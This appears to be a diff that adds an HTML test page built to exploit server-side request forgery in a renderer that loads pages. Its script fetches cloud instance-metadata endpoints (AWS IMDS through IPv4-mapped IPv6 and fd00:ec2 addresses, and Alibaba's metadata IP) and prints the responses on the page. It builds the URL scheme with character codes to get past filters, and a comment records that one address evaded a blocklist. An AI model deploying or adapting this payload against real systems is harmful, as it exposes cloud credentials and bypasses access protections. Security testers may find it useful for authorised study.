@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html><body>
+<h1>IPV4_MAPPED_IMDS_TEST</h1>
+<div id="r1">INITIAL</div>
+<div id="r2">INITIAL</div>
+<div id="r3">INITIAL</div>
+<div id="r4">INITIAL</div>
+<div id="r5">INITIAL</div>
+<div id="r6">INITIAL</div>
+<script>
+function syncFetch(id, url) {
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, false);
+    xhr.send();
+    document.getElementById(id).innerText = id + ' [' + xhr.status + '] ' + xhr.responseText.substr(0, 1000);
+  } catch(e) {
+    document.getElementById(id).innerText = id + ' [ERR] ' + e.name + ':' + e.message.substr(0,300);
+  }
+}
+
+setTimeout(function() {
+  var proto = String.fromCharCode(104,116,116,112);
+  // IPv4-mapped IPv6: ::ffff:169.254.169.254
+  syncFetch('r1', proto + '://[::ffff:a9fe:a9fe]/latest/meta-data/');
+  // IPv4-compatible: ::169.254.169.254
+  syncFetch('r2', proto + '://[::a9fe:a9fe]/latest/meta-data/');
+  // Alternative fd00 format 
+  syncFetch('r3', proto + '://[fd00:ec2:0:0:0:0:0:254]/latest/meta-data/');
+  // Expanded fd00:ec2::254
+  syncFetch('r4', proto + '://[fd00:0ec2:0000:0000:0000:0000:0000:0254]/latest/meta-data/');
+  // fd00:ec2::fe (different address on same prefix)
+  syncFetch('r5', proto + '://[fd00:ec2::fe]/latest/meta-data/');
+  // 100.100.100.200 (Alibaba) - confirmed not BAD_ADDRESS as inputUrl
+  syncFetch('r6', proto + '://100.100.100.200/latest/meta-data/');
+}, 0);
+</script>
+</body></html>
